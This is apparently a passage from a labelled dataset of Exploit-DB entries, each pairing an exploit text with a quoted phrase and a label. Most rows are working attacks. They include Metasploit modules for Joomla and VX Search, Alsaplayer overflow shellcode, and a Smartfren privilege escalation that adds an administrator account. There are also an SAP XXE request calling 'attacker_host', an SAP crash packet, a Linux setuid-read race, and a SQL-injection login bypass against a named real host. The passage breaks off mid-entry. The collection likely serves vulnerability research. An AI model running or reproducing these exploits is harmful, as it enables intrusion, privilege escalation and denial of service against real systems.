payload.encoded,         'task' => 'template.apply',         token => '1',         'jform[extension_id]' => template_id,         'jform[filename]' => ""/#{filename}.php""       }       })      if res && res.code == 303 && res.headers['Location'] =~ /\/administrator\/index.php\?option=com_templates&view=template&id=#{template_id}&file=/       print_status(""#{peer} - Payload data inserted into [ #{filename}.php ]"")     else       fail_with(Failure::Unknown, ""#{peer} - Could not insert payload into file [ #{filename}.php ]"")     end      # Request payload     register_files_for_cleanup(""#{filename}.php"")     print_status(""#{peer} - Executing payload"")     res = send_request_cgi({       'method'   => 'POST',       'uri'      => normalize_uri(target_uri.path, template_path, ""#{filename}.php""),       'cookie'  => auth_cookie     })    end  end",Request,0
22277,"Nuked-klaN 1.3 - Remote Information Disclosure source: https://www.securityfocus.com/bid/6917/info  A vulnerability has been discovered in Nuked-Klan which may be exploited to execute certain PHP functions on a target server. This issue occurs in the 'Team', 'News', and 'Lien' modules and is due to insufficient sanitization of user-supplied URI parameters.  This issue may be exploited by a remote attacker to obtain sensitive server information, which could aid in launching further attacks against a target system.  The vulnerability was reported for Nuked-Klan beta 1.3; earlier versions may also be affected.   http://www.example.org/index.php?file=Team&op=phpinfo http://www.example.org/index.php?file=News&op=phpinfo http://www.example.org/index.php?file=Liens&op=phpinfo",a malicious link,1
21814,"AlsaPlayer 0.99.71 - Local Buffer Overflow // source: https://www.securityfocus.com/bid/5767/info  Alsaplayer is a PCM player that utilizes the ALSA libraries and drivers. It is availabe for Linux and Unix platforms.  A vulnerability has been discovered in Alsaplayer. By specifying an overly long ""add-on path"", it is possible for an attacker to overrun the buffer, potentially allowing for execution of attacker-supplied code.  It should be noted that although Alsaplayer is not installed setuid by default, it is common practice for users to add a setuid bit to obtain certain functionality.   /*  * Alsaplayer exploit for a buffer overflow found by KF (snosoft.com)  *  * This program is not installed with special permissions by default.  * However, the author himself does recommend to do so under certain  * conditions:  *  * http://lists.tartarus.org/pipermail/alsaplayer-devel/2002-February/000656.html  * http://lists.tartarus.org/pipermail/alsaplayer-devel/2002-February/000657.html  *  * Author: zillion[at]safemode.org (09/2002)  *  * Tested on Red Hat 7.3 linux with alsaplayer-devel-0.99.71-1  *  */  #include <unistd.h> #include <sys/stat.h> #include <string.h>  #define BUFFER_SIZE 1056 #define NOP 0x90 #define RET 0xbfffe440  char shellcode[]=  ""\xeb\x26\x5e\x31\xc0\x89\xc3\x89\xc1\x89\xc2\xb0\xa4\xcd\x80"" ""\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b"" ""\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xd5\xff\xff\xff"" ""\x2f\x62\x69\x6e\x2f\x73\x68"";  void print_error(char * burb) {   printf("" Error: %s !\n"",burb); exit(0); }  void usage(char *progname) {   printf(""\n*--- -- -  Alsaplayer b0f exploit - -- ---*\n"");   printf(""\nDefault: %s  -f /path/to/alsaplayer"",progname);   printf(""\nOption : %s  -o <offset>\n\n"",progname);   exit(0); }  int main(int argc, char **argv){    char buffer[BUFFER_SIZE];   char file[30];   long retaddress;   int arg,offset=500;    struct stat sbuf;    if(argc < 2) { usage(argv[0]); }    while ((arg = getopt (argc, argv, ""f:o:"")) != -1){     switch (arg){     case 'f':       strncpy(file,optarg,sizeof(file));       if(stat(argv[2], &sbuf)) { print_error(""No such file"");}       break;     case 'o':       offset = atoi(optarg);       if(offset < 0) { print_error(""Offset must be positive"");}       break;     default :       usage(argv[0]);     }   }    retaddress = (RET - offset);   memset(buffer,NOP,BUFFER_SIZE);   memcpy(buffer + BUFFER_SIZE - (sizeof(shellcode) + 8) ,shellcode,sizeof(shellcode) -1);    /* Overwrite EBP and EIP */   *(long *)&buffer[BUFFER_SIZE - 8]  = retaddress;   *(long *)&buffer[BUFFER_SIZE - 4]  = retaddress;    if(execl(file,file,""-p"",buffer,NULL) != 0) {     print_error(""Could not execute alsaplayer "");   }    return 0;  }","specifying an overly long ""add-on path""",1
21547,"Smartfren Connex EC 1261-2 UI OUC - Local Privilege Escalation ==========================================================================  Smartfren Connex EC 1261-2 UI OUC Local Privilege Escalation Vulnerability  ==========================================================================  :-------------------------------------------------------------------------------------------------------------------------------------: : # Exploit Title : Smartfren Connex EC 1261-2 UI OUC Local Privilege Escalation Vulnerability  : # Date : 26 September 2012  : # Author : X-Cisadane  : # Software Link : http://www.smartfren.com/data/ec1261.html   : # File Version : 21.005.15.03.836   : # Category : Desktop (Windows) Applications  : # Platform : Win32 & Win64  : # Vulnerability : Local Privilege Escalation Vulnerability  : # Tested On : Microsoft Windows 7 Ultimate 64 Bit (EN)  : # Greetz to : X-Code, Borneo Crew, Depok Cyber, Explore Crew, CodeNesia, Bogor-H, Jakarta Anonymous Club, Jabarcyber, Winda utari :-------------------------------------------------------------------------------------------------------------------------------------: Summary ======== Smartfren Connex EC 1261-2 UI OUC is part of Smartfren Connex EC USB EVDO Modem files.  Smartfren Connex EC 1261-2 UI OUC is a daemon for updating the USB EVDO Modem files of Smartfren Connex.  Description =========== Improper file permissions on executable file of the application could result on Local Privilege Escalation Vulnerability. It can be used by a simple user that can change the executable file with a binary of choice.  The binary (ouc.exe) is set by default to Startup and will be executed with SYSTEM privileges.  Tested on : Microsoft Windows 7 Ultimate 64 Bit (EN).  Proof of Concept ================ C:\Program Files (x86)\Smartfren Connex EC1261-2 UI\UpdateDog>>cacls ouc.exe C:\Program Files (x86)\Smartfren Connex EC1261-2 UI\UpdateDog\ouc.exe 	Everyone:F   									BUILTIN\Users:F                                                                       	NT AUTHORITY\SYSTEM:(ID)F                                                                       	BUILTIN\Administrators:(ID)F  C:\Program Files (x86)\Smartfren Connex EC1261-2 UI\UpdateDog>sc qc ""Smartfren Connex EC1261-2 UI. RunOuc"" [SC] QueryServiceConfig SUCCESS  SERVICE_NAME: Smartfren Connex EC1261-2 UI. RunOuc         TYPE               : 110  WIN32_OWN_PROCESS (interactive)         START_TYPE         : 2   AUTO_START         ERROR_CONTROL      : 1   NORMAL         BINARY_PATH_NAME   : C:\Program Files (x86)\Smartfren Connex EC1261-2 UI\UpdateDog\ouc.exe         LOAD_ORDER_GROUP   :         TAG                : 0         DISPLAY_NAME       : Smartfren Connex EC1261-2 UI. OUC         DEPENDENCIES       :         SERVICE_START_NAME : LocalSystem  ---------------------------------------------------------------------------------------------- The following attack scenario could be used : 1. An attacker (unprivileged user) rename Smartfren Connex EC1261-2 UI. OUC program file.  For example, the Smartfren Connex EC1261-2 UI. OUC program file could be : For Win32 ---> X:\Program Files\Smartfren Connex EC1261-2 UI\UpdateDog\ouc.exe (Smartfren Connex EC1261-2 UI Update Manager)  For Win64 ---> X:\Program Files (x86)\Smartfren Connex EC1261-2 UI\UpdateDog\ouc.exe (Smartfren Connex EC1261-2 UI Update Manager) Rename the file to ouc.exe.old 2. An attacker copies his malicious executable file (with same name as the old filename of the FILE - ouc.exe) in the same location. 3. Restart the system. After restart attackers malicious file will be executed with SYSTEM privileges.  You can also do it with these simple program : ------------------------------------- [ CUT HERE ] ------------------------------------------- Compile these script below with Dev-C++ Save in the C:\sploit.cpp  #include <stdio.h> #include <windows.h> #define DEFAULT_TARGET  ""C:\\Program Files (x86)\\Smartfren Connex EC1261-2 UI\\UpdateDog\\ouc.exe"" #define DEFAULT_BACKUP  ""C:\\Program Files (x86)\\Smartfren Connex EC1261-2 UI\\UpdateDog\\ouc.exe.old"" #define DEFAULT_EXECUTE ""C:\\bin.exe"" int main(int argc, char *argv[]) {       MoveFile(DEFAULT_TARGET, DEFAULT_BACKUP);      CopyFile(DEFAULT_EXECUTE, DEFAULT_TARGET, FALSE);      return 0; }    Compile these script below with Dev-C++ Save in the C:\bin.cpp  #include <stdio.h> #include <windows.h> #define CMD ""C:\\WINDOWS\\system32\\cmd.exe"" #define ONE ""/C net user xcisadane xcisadane /add"" #define TWO ""/C net localgroup administrators xcisadane /add"" int main(int argc, char *argv[]) { STARTUPINFO si = {sizeof(STARTUPINFO)}; PROCESS_INFORMATION pi;      CreateProcess(CMD, ONE, NULL, NULL, 0, 0, NULL, NULL, &si, &pi);      CreateProcess(CMD, TWO, NULL, NULL, 0, 0, NULL, NULL, &si, &pi);      return 0; } ------------------------------------- [ CUT HERE ] ------------------------------------------- Execute file sploit.exe that located in C:\ Reboot your Windows. After reboot, let's check Net User from Command Prompt, if there an user with name xcisadane, so you have successfully! P.S : For Win32 please change Program Files (x86) to Program Files.",change the executable file with a binary of choice,1
40816,"SAP NetWeaver AS JAVA - 'BC-BMT-BPM-DSK' XML External Entity Injection Application:	SAP NetWeaver AS JAVA Versions Affected:	SAP NetWeaver AS JAVA 7.5 Vendor URL:	SAP Bugs:	XXE Reported:	09.03.2016 Vendor response:	10.03.2016 Date of Public Advisory:	09.08.2016 Reference:	SAP Security Note 2296909 Author:	Vahagn Vardanyan (ERPScan)  1. ADVISORY INFORMATION  Title:  [ERPSCAN-16-034] SAP NetWeaver AS JAVA – XXE vulnerability in BC-BMT-BPM-DSK component Advisory ID:[ERPSCAN-16-034] Risk: high Advisory URL: https://erpscan.com/advisories/erpscan-16-034-sap-netweaver-java-xxe-vulnerability-bc-bmt-bpm-dsk-component/ Date published: 11.11.2016 Vendors contacted: SAP   2. VULNERABILITY INFORMATION  Class: XXE Impact: Denial of Service, Read File Remotely Exploitable: yes Locally Exploitable: no  CVSS Information  CVSS Base Score v3:    6.4 / 10 CVSS Base Vector: AV : Attack Vector (Related exploit range) Network (N) AC : Attack Complexity (Required attack complexity) High (H) PR : Privileges Required (Level of privileges needed to exploit) Low (L) UI : User Interaction (Required user participation) None (N) S : Scope (Change in scope due to impact caused to components beyond the vulnerable component) Unchanged (U) C : Impact to Confidentiality Low (L) I : Impact to Integrity Low (L) A : Impact to Availability High (H)   3. VULNERABILITY DESCRIPTION  1) It is possible, that an attacker can perform a DoS attack (for example, an XML Entity expansion attack)  2) An SMB Relay attack is a type of man-in-the-middle attack where an attacker asks a victim to authenticate to a machine controlled by the attacker, then relays the credentials to the target. The attacker forwards the authentication information both ways, giving him access.   4. VULNERABLE PACKAGES  BPEM PORTAL CONTENT 7.20 BPEM PORTAL CONTENT 7.30 BPEM PORTAL CONTENT 7.31 BPEM PORTAL CONTENT 7.40 BPEM PORTAL CONTENT 7.50   5. SOLUTIONS AND WORKAROUNDS  To correct this vulnerability, install SAP Security Note  2296909   6. AUTHOR   Vahagn Vardanyan (ERPScan)   7. TECHNICAL DESCRIPTION  PoC   POST /sap.com~tc~bpem~him~uwlconn~provider~web/bpemuwlconn HTTP/1.1  Content-Type: text/xml  User-Agent: ERPscan  Host: SAP_IP:SAP_PORT  Content-Length: 480  Connection: Keep-Alive  Cache-Control: no-cache  Authorization: Basic ZXJwc2NhbjplcnBzY2Fu   <!DOCTYPE foo [<!ENTITY xxe SYSTEM ""http://attacker_host""> ]><SOAP-ENV:Envelope xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/"" xmlns:SOAP-ENC=""http://schemas.xmlsoap.org/soap/encoding/"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"">     <SOAP-ENV:Body>         <m:isBPMSInUse xmlns:m=""http://api.facade.bpem.sap.com/""/>     &xxe;</SOAP-ENV:Body>  </SOAP-ENV:Envelope>   8. REPORT TIMELINE  Sent:  09.03.2016 Reported: 10.03.2016 Vendor response: 10.03.2016 Date of Public Advisory: 09.08.2016   9. REFERENCES  https://erpscan.com/advisories/erpscan-16-034-sap-netweaver-java-xxe-vulnerability-bc-bmt-bpm-dsk-component/",malicious webpage,1
38709,"MCImageManager - Multiple Vulnerabilities source: https://www.securityfocus.com/bid/61825/info  MCImageManager is prone to multiple security vulnerabilities.  An attacker may exploit these issues to execute arbitrary HTML and script code in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication credentials, manipulate the page and spoof content to misguide users and to disclose or modify sensitive information. Other attacks may also be possible.  MCImageManager 3.1.5 and prior versions are vulnerable.    http://www.example.com/tiny_mce/plugins/imagemanager/pages/im/flvplayer/flvPlayer.swf?flvToPlay=1.flv  http://www.example.com/tiny_mce/plugins/imagemanager/pages/im/flvplayer/flvPlayer.swf?autoStart=false&startImage=1.jpg  http://www.example.com/tiny_mce/plugins/imagemanager/pages/im/flvplayer/flvPlayer.swf?flvToPlay=1.flv&autoStart=false&startImage=1.jpg  http://www.example.com/tiny_mce/plugins/imagemanager/pages/im/flvplayer/flvPlayer.swf?flvToPlay=1.xml  File 1.xml:  <?xml version=""1.0"" encoding=""UTF-8""?> <playlist> <item name=""Content Spoofing"" thumbnail=""1.jpg"" url=""1.flv""/> <item name=""Content Spoofing"" thumbnail=""2.jpg"" url=""2.flv""/> </playlist>   <html> <body> <script> function flvStart() { alert('XSS'); } function flvEnd() { alert('XSS'); } </script> <object width=""50%"" height=""50%""> <param name=movie value=""flvPlayer.swf""> <param name=quality value=high>  <embed src=""flvPlayer.swf?flvToPlay=1.flv&jsCallback=true"" width=""50%"" height=""50%"" quality=high pluginspage=""http://www.example1.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash""; type=""application/x-shockwave-flash""></embed>  </object> </body> </html>",manipulate the page and spoof content,1
42057,"VX Search Enterprise 9.5.12 - GET Buffer Overflow (Metasploit) ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule < Msf::Exploit::Remote   Rank = GreatRanking    include Msf::Exploit::Remote::Seh   include Msf::Exploit::Remote::Egghunter   include Msf::Exploit::Remote::HttpClient    def initialize(info = {})     super(update_info(info,       'Name'           => 'VX Search Enterprise GET Buffer Overflow',       'Description'    => %q{         This module exploits a stack-based buffer overflow vulnerability         in the web interface of VX Search Enterprise v9.5.12, caused by         improper bounds checking of the request path in HTTP GET requests         sent to the built-in web server. This module has been tested         successfully on Windows 7 SP1 x86.       },       'License'        => MSF_LICENSE,       'Author'         =>         [           'Daniel Teixeira'         ],       'DefaultOptions' =>         {           'EXITFUNC' => 'thread'         },       'Platform'       => 'win',       'Payload'        =>         {           'BadChars'   => ""\x00\x09\x0a\x0d\x20\x26"",           'Space'      => 500         },       'Targets'        =>         [           [ 'VX Search Enterprise v9.5.12',             {               'Offset' => 2488,               'Ret'    => 0x10015ffe  # POP # POP # RET [libspp.dll]             }           ]         ],       'Privileged'     => true,       'DisclosureDate' => 'Mar 15 2017',       'DefaultTarget'  => 0))   end    def check     res = send_request_cgi(       'method' => 'GET',       'uri'    => '/'     )      if res && res.code == 200       version = res.body[/VX Search Enterprise v[^<]*/]       if version         vprint_status(""Version detected: #{version}"")         if version =~ /9\.5\.12/           return Exploit::CheckCode::Appears         end         return Exploit::CheckCode::Detected       end     else       vprint_error('Unable to determine due to a HTTP connection timeout')       return Exploit::CheckCode::Unknown     end      Exploit::CheckCode::Safe   end    def exploit      eggoptions = {       checksum: true,       eggtag: rand_text_alpha(4, payload_badchars)     }      hunter, egg = generate_egghunter(       payload.encoded,       payload_badchars,       eggoptions     )      sploit =  rand_text_alpha(target['Offset'])     sploit << generate_seh_record(target.ret)     sploit << hunter     sploit << make_nops(10)     sploit << egg     sploit << rand_text_alpha(5500)      print_status('Sending request...')      send_request_cgi(       'method' => 'GET',       'uri'    => sploit     )   end end",improper bounds checking of the request path in HTTP GET requests sent to the built-in web server,1
43248,"Apple macOS 10.13.1 (High Sierra) - 'Blank Root' Local Privilege Escalation ## Source: https://twitter.com/lemiorhan/status/935578694541770752 & https://forums.developer.apple.com/thread/79235 ""Dear @AppleSupport, we noticed a *HUGE* security issue at MacOS High Sierra. Anyone can login as ""root"" with empty password after clicking on login button several times. Are you aware of it @Apple?""   ## Proof: https://twitter.com/patrickwardle/status/935608904377077761   ## Mitigation/Detection/Forensic: https://news.ycombinator.com/item?id=15800676 - Can be mitigated by enabling the root user with a strong password - Can be detected with `osquery` using `SELECT * FROM plist WHERE path = ""/private/var/db/dslocal/nodes/Default/users/root.plist"" AND key = ""passwd"" AND length(value) > 1;"";` - You can see what time the root account was enabled using `SELECT * FROM plist WHERE path = ""/private/var/db/dslocal/nodes/Default/users/root.plist"" WHERE key = ""accountPolicyData"";` then base 64 decoding that into a file and then running `plutil -convert xml1` and looking at the `passwordLastSetTime` field. _Note: osquery needs to be running with `sudo` but if you have it deployed across a fleet of macs as a daemon then it will be running with `sudo` anyway._ _Note: You can get the same info with plutil(1): `$ sudo plutil -p /private/var/db/dslocal/nodes/Default/users/root.plist`_   ## Security Advisory: https://support.apple.com/en-gb/HT208315",enabling the root user with a strong password,1
40593,"SAP Adaptive Server Enterprise 16 - Denial of Service ''' Application:   SAP Adaptive Server Enterprise  Versions Affected: SAP Adaptive Server Enterprise  16  Vendor URL: http://SAP.com  Bugs: Denial of Service  Sent:   01.02.2016  Reported: 02.02.2016  Vendor response: 02.02.2016  Date of Public Advisory: 12.07.2016  Reference: SAP Security Note  2330839  Author:  Vahagn Vardanyan(ERPScan)    Description    1. ADVISORY INFORMATION  Title: [ERPSCAN-16-028] SAP Adaptive Server Enterprise – DoS vulnerability  Advisory ID: [ERPSCAN-16-028]  Risk: high  Advisory URL: https://erpscan.com/advisories/erpscan-16-028-sap-adaptive-server-enterprise-null-pointer-exception/  Date published: 12.17.2016  Vendors contacted: SAP   2. VULNERABILITY INFORMATION  Class: Denial of Service  Impact: DoS  Remotely Exploitable: yes  Locally Exploitable: yes   CVSS Information  CVSS Base Score v3:  7.5  / 10  CVSS Base Vector:  AV : Attack Vector (Related exploit range) Network (N)  AC : Attack Complexity (Required attack complexity) Low (L)  PR : Privileges Required (Level of privileges needed to exploit) None (N)  UI : User Interaction (Required user participation) None (N)  S : Scope (Change in scope due to impact caused to components beyond the vulnerable component) Unchanged (U)  C : Impact to Confidentiality None (N)  I : Impact to Integrity None (N)  A : Impact to Availability High (H)   3. VULNERABILITY DESCRIPTION  Anonymous attacker can send a special request to the SAP Adaptive Server Enterprise and crash the server.   4. VULNERABLE PACKAGES  SAP Open Server 16.0 SP01, SP02  SAP ASE 16.0 SP01, SP02  SAP Replication Server SP207, SP209, SP210, SP3XX   5. SOLUTIONS AND WORKAROUNDS  To correct this vulnerability, install SAP Security Note  2330839   6. AUTHOR  Vahagn Vardanyan (ERPScan)    7. TECHNICAL DESCRIPTION  Proof of Concept  Sending special request to the SAP Adaptive Server Enterprise 16 (backup server)  can get crash the server.   PoC '''  import socket  PoC = ""\xe2\xf3\x00\x9d\x80\x8e\xf3\xa0"" \      ""\x80\xb4\x00\x81\xb0\x00\x00\x93"" \      ""\x00\x00\x00\x00\x00\x00\x00\x00"" \      ""\x00\x00\x00\x00\x00\x00\x00\x00"" \      ""\x00\x00\x00\x00\x00\x00\x00\x00"" \      ""\x31\x00\x00\x00\x00\x00\x00\x00"" \      ""\x00\x00\x00\x00\x00\x00\x00\x00"" \      ""\x00\x00\x34\x31\x30\x35\x37\x32"" \      ""\x37\x00\x00\x00\x00\x00\x00\x00"" \      ""\x00\x00\x00\x00\x00\x00\x00\x00"" \      ""\x00\x00\x00\x00\x00\x00\x00\x00"" \      ""\x00\x00\x00\x00\x00\x00\x00\x00"" \      ""\x00\x00\x00\x00\x00\x00\x00\x00"" \      ""\x00\x00\x00\x00\x00\x00\x00\x00"" \      ""\x00\x00\x00\x00\x00\x00\x00\x00"" \      ""\x00\x00\x00\x00\x00\x00\x00\x00"" \      ""\x00\x00\x00\x00\x00\x00\x00\x00"" \      ""\x00\x00\x00\x00\x00\x00\x00\x00"" \      ""\x00\x00\x00\x00\x00\x00\x00\x00"" \      ""\x00\x00\x00\x00\x00\x00\x00\x00"" \      ""\x00""  s = socket.socket() s.settimeout(1) s.connect((SERVER_IP, SERVER_PORT)) s.send(PoC) print(PoC) s.close()  '''  0:019> r rax=0000000000000000 rbx=000000000097c000 rcx=0000000000000000 rdx=00000000010bf810 rsi=0000000000970a30 rdi=0000000000904cb0 rip=00000000004027b4 rsp=00000000010bf7f0 rbp=0000000000000000 r8=0000000000904c90  r9=0000000000904ca0 r10=0000000000000000 r11=0000000000000246 r12=0000000000000000 r13=0000000000000000 r14=0000000000000000 r15=0000000000000000 iopl=0         nv up ei pl nz na po nc cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206 libsybcomn64!comn_symkey_set_iv+0x34: 00000000`004027b4 488b4820        mov     rcx,qword ptr [rax+20h] ds:00000000`00000020=????????????????   8. REPORT TIMELINE  Sent:  01.02.2016  Reported: 02.02.2016  Vendor response: 02.02.2016  Date of Public Advisory: 12.07.2016   9. REFERENCES  https://erpscan.com/advisories/erpscan-16-028-sap-adaptive-server-enterprise-null-pointer-exception/   10. ABOUT ERPScan Research  ERPScan research team specializes in vulnerability research and analysis of critical enterprise applications. It was acknowledged multiple times by the largest software vendors like SAP, Oracle, Microsoft, IBM, VMware, HP for discovering more than 400 vulnerabilities in their solutions (200 of them just in SAP!).  ERPScan researchers are proud of discovering new types of vulnerabilities (TOP 10 Web Hacking Techniques 2012) and of the ""The Best Server-Side Bug"" nomination at BlackHat 2013.  ERPScan experts participated as speakers, presenters, and trainers at 60+ prime international security conferences in 25+ countries across the continents ( e.g. BlackHat, RSA, HITB) and conducted private trainings for several Fortune 2000 companies.  ERPScan researchers carry out the EAS-SEC project that is focused on enterprise application security awareness by issuing annual SAP security researches.  ERPScan experts were interviewed in specialized info-sec resources and featured in major media worldwide. Among them there are Reuters, Yahoo, SC Magazine, The Register, CIO, PC World, DarkReading, Heise, Chinabyte, etc.  Our team consists of highly-qualified researchers, specialized in various fields of cybersecurity (from web application to ICS/SCADA systems), gathering their experience to conduct the best SAP security research.  11. ABOUT ERPScan  ERPScan is the most respected and credible Business Application Cybersecurity provider. Founded in 2010, the company operates globally and enables large Oil and Gas, Financial, Retail and other organizations to secure their mission-critical processes. Named as an ‘Emerging Vendor’ in Security by CRN, listed among “TOP 100 SAP Solution providers” and distinguished by 30+ other awards, ERPScan is the leading SAP SE partner in discovering and resolving security vulnerabilities. ERPScan consultants work with SAP SE in Walldorf to assist in improving the security of their latest solutions.  ERPScan’s primary mission is to close the gap between technical and business security, and provide solutions for CISO's to evaluate and secure SAP and Oracle ERP systems and business-critical applications from both cyberattacks and internal fraud. As a rule, our clients are large enterprises, Fortune 2000 companies and MSPs, whose requirements are to actively monitor and manage security of vast SAP and Oracle landscapes on a global scale.  We ‘follow the sun’ and have two hubs, located in Palo Alto and Amsterdam, to provide threat intelligence services, continuous support and to operate local offices and partner network spanning 20+ countries around the globe.    Adress USA: 228 Hamilton Avenue, Fl. 3, Palo Alto, CA. 94301  Phone: 650.798.5255  Twitter: @erpscan  Scoop-it: Business Application Security '''",send a special request,1
22840,"Linux Kernel 2.4 - SUID 'execve()' System Call Race Condition Executable File Read /* source: https://www.securityfocus.com/bid/8042/info  A race condition vulnerability has been discovered in the Linux execve() system call, affecting the 2.4 kernel tree. The problem lies in the atomicity of placing a target executables file descriptor within the current process descriptor and executing the file.  An attacker could potentially exploit this vulnerability to gain read access to a setuid binary that would otherwise be unreadable. Although unconfirmed, it may also be possible for an attacker to write code to a target executable, making it theoretically possible to execute arbitrary code with elevated privileges. */  /**************************************************************** *								* *	Linux 2.4.x suid exec/file read race proof of concept	* *	by IhaQueR						* *								* ****************************************************************/    #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <errno.h> #include <sched.h> #include <fcntl.h> #include <signal.h>  #include <sys/types.h> #include <sys/stat.h>  #include <asm/page.h>    void fatal(const char *msg) {     printf(""\n"");     if (!errno) { 	fprintf(stderr, ""FATAL: %s\n"", msg);     } else { 	perror(msg);     }      printf(""\n"");     fflush(stdout);     fflush(stderr);     exit(129); }   int child(char **av) {     int fd;      printf(""\nChild running pid %d"", getpid());     fflush(stdout);     usleep(100000);      execvp(av[0], av + 1);      printf(""\nFatal child exit\n"");     fflush(stdout);     exit(0); }   void exitus(int v) {     printf(""\nParent terminating (child exited)\n\n"");     fflush(stdout);     exit(129); }  void usage(const char *name) {     printf(""\nSuid exec dumper by IhaQueR\n"");     printf(""\nUSAGE:\t%s executable [args...]"", name);     printf(""\n\n"");     fflush(stdout);     exit(0); }   int main(int ac, char **av) {     int p = 0, fd = 0;     struct stat st, st2;      if (ac < 2) 	usage(av[0]);      av[0] = (char *) strdup(av[1]);     av[1] = (char *) basename(av[1]);      p = stat(av[0], &st2);     if (p) 	fatal(""stat"");      signal(SIGCHLD, &exitus);     printf(""\nParent running pid %d"", getpid());     fflush(stdout);      __asm__ (              ""pusha              \n""              ""movl $0x411, %%ebx \n""              ""movl %%esp, %%ecx  \n""              ""movl $120, %%eax   \n""              ""int  $0x80         \n""              ""movl %%eax, %0     \n""              ""popa""              : : ""m""(p)             );      if (p < 0) 	fatal(""clone"");      if (!p) 	child(av);      printf(""\nParent stat loop"");     fflush(stdout);     while (1) { 	p = fstat(3, &st); 	if (!p) { 	    if (st.st_ino != st2.st_ino) 		fatal(""opened wrong file!"");  	    p = lseek(3, 0, SEEK_SET); 	    if (p == (off_t) - 1) 		fatal(""lseek""); 	    fd = open(""suid.dump"", O_RDWR | O_CREAT | O_TRUNC | O_EXCL, 		      0755); 	    if (fd < 0) 		fatal(""open""); 	    while (1) { 		char buf[8 * PAGE_SIZE];  		p = read(3, buf, sizeof(buf)); 		if (p <= 0) 		    break; 		write(fd, buf, p); 	    } 	    printf(""\nParent success stating:""); 	    fflush(stdout); 	    printf(""\nuid %d gid %d mode %.5o inode %u size %u"", 		   st.st_uid, st.st_gid, st.st_mode, st.st_ino, 		   st.st_size); 	    fflush(stdout); 	    printf(""\n""); 	    fflush(stdout); 	    exit(1); 	}     }      printf(""\n\n"");     fflush(stdout);      return 0; }",placing a target executables file descriptor within the current process descriptor and executing the file,1
35529,"Soitec SmartEnergy 1.4 - SCADA Login SQL Injection / Authentication Bypass ﻿ Soitec SmartEnergy 1.4 SCADA Login SQL Injection Authentication Bypass Exploit   Vendor: Soitec Product web page: http://www.soitec.com Affected version: 1.4 and 1.3  Summary: Soitec power plants are a profitable and ecological investment at the same time. Using Concentrix technology, Soitec offers a reliable, proven, cost-effective and bankable solution for energy generation in the sunniest regions of the world. The application shows how Concentrix technology works on the major powerplants managed by Soitec around the world. You will be able to see for each powerplant instantaneous production, current weather condition, 3 day weather forecast, Powerplant webcam and Production data history.  Desc: Soitec SmartEnergy web application suffers from an authentication bypass vulnerability using SQL Injection attack in the login script. The script fails to sanitize the 'login' POST parameter allowing the attacker to bypass the security mechanism and view sensitive information that can be further used in a social engineering attack.  Tested on: nginx/1.6.2   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             @zeroscience   Vendor status:  [16.11.2014] Vulnerability discovered. [02.12.2014] Vendor contacted. [08.12.2014] Vendor responds asking more details. [08.12.2014] Sent details to the vendor. [09.12.2014] Vendor confirms the vulnerability. [12.12.2014] Vendor applies fix to version 1.4. [14.12.2014] Coordinated public security advisory released.   Advisory ID: ZSL-2014-5216 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2014-5216.php   16.11.2014  ---    POST /scada/login HTTP/1.1 Host: smartenergy.soitec.com User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://smartenergy.soitec.com/scada/login Cookie: csrftoken=ygUcdD2i1hFxUM6WpYB9kmrWqFhlnSBY; _ga=GA1.2.658394151.1416124715; sessionid=ixi3w5s72yopc29t9ewrxwq15lzb7v1e Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 87  csrfmiddlewaretoken=ygUcdD2i1hFxUM6WpYB9kmrWqFhlnSBY&login=%27+or+1%3D1--&password=blah",SQL Injection attack in the login script,1
47452,"WebKit - User-agent Shadow root Leak in WebCore::ReplacementFragment::ReplacementFragment <!-- VULNERABILITY DETAILS editing/ReplaceSelectionCommnd.cpp: ``` Ref<HTMLElement> ReplacementFragment::insertFragmentForTestRendering(Node* rootEditableElement) {     auto holder = createDefaultParagraphElement(document());      holder->appendChild(*m_fragment);     rootEditableElement->appendChild(holder); // ***2***     document().updateLayoutIgnorePendingStylesheets();      return holder; }  [...]  ReplacementFragment::ReplacementFragment(Document& document, DocumentFragment* fragment, const VisibleSelection& selection)     : m_document(&document)     , m_fragment(fragment)     , m_hasInterchangeNewlineAtStart(false)     , m_hasInterchangeNewlineAtEnd(false) {     if (!m_fragment)         return;     if (!m_fragment->firstChild())         return;          RefPtr<Element> editableRoot = selection.rootEditableElement(); // ***1***     ASSERT(editableRoot);     if (!editableRoot)         return;    [...]     RefPtr<StyledElement> holder = insertFragmentForTestRendering(editableRoot.get()); ```  html/shadow/SliderThumbElement.cpp ``` RefPtr<HTMLInputElement> SliderThumbElement::hostInput() const {     // Only HTMLInputElement creates SliderThumbElement instances as its shadow nodes.     // So, shadowHost() must be an HTMLInputElement.     return downcast<HTMLInputElement>(shadowHost()); // ***3*** } ```  I noticed this behavior when I was debugging the test case for https://bugs.webkit.org/show_bug.cgi?id=199146. When the currently focused element is an <input>, `selection.rootEditableElement()` in [1] might point to a node inside the <input>'s user-agent shadow DOM tree. Then `insertFragmentForTestRendering` is called, which might have side effects, e.g., if the inserted fragment contains an <iframe> element its ""onload"" handler will be called synchronously, and it's possible to reach the user-agent shadow root object by following the ancestor chain from the <iframe>.  When an attacker has access to the shadow root, she can use it to leak other elements that are only intended for internal use and have less strict security checks. For example, `SliderThumbElement` doesn't check that its host element is an <iframe> in [3], so the attacker can turn this bug into a type confusion vulnerability.   VERSION WebKit revision 246194 Safari version 12.1.1 (14607.2.6.1.1)   REPRODUCTION CASE -->  <body> <script> input = 